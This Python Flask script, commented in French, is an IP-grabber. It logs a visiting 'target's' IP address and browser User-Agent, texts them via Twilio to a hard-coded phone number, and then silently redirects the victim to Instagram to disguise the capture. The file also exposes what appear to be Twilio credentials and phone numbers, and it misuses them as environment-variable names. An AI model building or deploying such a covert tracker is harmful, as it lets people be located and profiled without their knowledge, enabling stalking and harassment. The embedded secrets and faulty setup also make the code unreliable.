import os
from flask import Flask, request, redirect
from twilio.rest import Client

app = Flask(__name__)

# Récupérer les identifiants Twilio depuis les variables d'environnement
account_sid = os.environ.get('AC2ef2bd5bd5146f76f586d2c577159f90')
auth_token = os.environ.get('ec746c04233667b9836c82d9512a9ee9')

# Créer le client Twilio
client = Client(account_sid, auth_token)

# Route principale qui gère la récupération de l'adresse IP et user-agent
@app.route('/')
def index():
    # Récupérer l'adresse IP de la cible
    ip_address = request.remote_addr
    # Récupérer l'user-agent de la cible
    user_agent = request.headers.get('User-Agent')

    # Afficher les informations récupérées dans la console pour les tests
    print(f'IP Address: {ip_address}')
    print(f'User Agent: {user_agent}')

    # Envoi du SMS avec les informations récupérées
    send_sms(ip_address, user_agent)

    # Rediriger l'utilisateur vers l'URL cible (par exemple, un lien Instagram)
    return redirect("https://www.instagram.com", code=302)

# Fonction pour envoyer le SMS via Twilio
def send_sms(ip_address, user_agent):
    # Ton numéro Twilio et le numéro de réception (à remplacer par des valeurs valides)
    to_phone_number = "+33635960569"  # Remplace avec le numéro du destinataire
    from_phone_number = "+12524866318"  # Remplace avec ton numéro Twilio

    # Créer le message
    message = f"IP: {ip_address}\nUser-Agent: {user_agent}"

    # Envoi du message SMS
    client.messages.create(
        body=message,
        from_=from_phone_number,
        to=to_phone_number
    )

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
